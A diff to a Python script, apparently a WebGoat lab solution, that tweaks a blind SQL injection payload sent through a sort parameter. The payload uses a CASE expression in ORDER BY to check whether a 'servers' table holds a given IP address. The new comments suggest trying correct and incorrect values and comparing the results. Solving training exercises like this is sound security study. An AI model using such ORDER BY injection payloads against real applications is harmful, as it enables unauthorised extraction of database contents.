@@ -54,8 +54,9 @@ def getRequest(sortBy, debug=True):
 def test():
     #sort by id, hostname, ip
     #sortBy = 'hostname'
-    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.10' then \
-        id else hostname end)" # this is true; so sort by id; also we confirmed that servers table exists
+    # change webgoat-pre-prod ip with correct and incorrect and see the result
+    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.10' then id else hostname end)"
+    # this is true; so sort by id; also we confirmed that servers table exists
     if getRequest(sortBy, True):
         print('Success!')
     else:
